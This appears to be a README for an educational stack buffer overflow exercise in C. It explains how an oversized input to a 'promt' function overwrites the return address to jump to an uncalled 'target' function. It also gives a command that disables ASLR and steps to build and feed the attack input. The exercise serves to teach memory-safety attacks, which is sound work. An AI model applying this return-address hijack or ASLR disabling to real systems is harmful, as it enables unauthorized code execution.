This program is written in C using gdb to call a function, which never meant to be called.
Here, promt function is called in main function which accepts the string as input. If your input string size is more than the buf[]
(char array with size 100 here) and override the return address of function promt (which you can easily get using gdb) with the address
of target function then return function call from promt will go to target function.

Disable address space layout randomization (ASLR):
sudo sysctl -w kernel.randomize_va_space=0	

Steps to run:
1. Run the make command to compile vuln_program.c and attack-string.c
2. ./attack-string $'\xe0\x8e\x04\x08' > ./attack.input  (here '\xe0\x8e\x04\x08' is the address of target function)
3. ./vuln-program < ./attack.input
